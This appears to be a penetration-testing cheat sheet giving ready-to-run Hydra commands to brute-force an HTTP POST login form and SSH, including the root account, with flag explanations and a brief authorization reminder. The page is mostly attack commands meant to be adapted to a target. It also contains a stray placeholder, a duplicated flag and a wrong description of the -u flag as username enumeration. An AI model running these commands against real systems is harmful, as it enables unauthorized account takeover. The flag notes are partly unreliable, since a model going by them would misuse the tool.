# Hydra

```
HTTP POST Form
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
```

```
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh
hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh
```

```
// Some code
```

#### HTTP POST Form Attack Using Hydra

To launch a brute force attack against an HTTP POST form, you can use the following command with Hydra:

```bash
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
```

In this command:

* Replace `http://10.10.10.10/` with the target URL.
* Adjust the `/login.php:user=^USER^&password=^PASS^:Incorrect credentials` string to match the form data and failure message.
* The `-L` flag specifies a file with usernames, and `-P` specifies a file with passwords.
* The `-f` flag tells Hydra to stop after the first correct password is found.
* The `-V` flag increases the verbosity, showing the attempts in the output.

#### SSH Brute Forcing with Hydra

To perform a brute force attack on SSH, you can use Hydra with variations of the following commands:

For a list of users:

```bash
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh
```

For a single user:

```bash
hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh
```

Notes:

* The `-v` and `-V` flags are for verbose mode, showing the login attempts.
* The `-u` flag is used to perform a username enumeration.
* The `-L` and `-l` flags are for specifying the username list and a single username, respectively.
* The `-P` flag is for the password list.
* The `-t` flag controls the number of concurrent connections (threads).

Please ensure to have the correct permission and authorization before attempting any form of penetration testing. Unauthorized access is illegal and unethical.
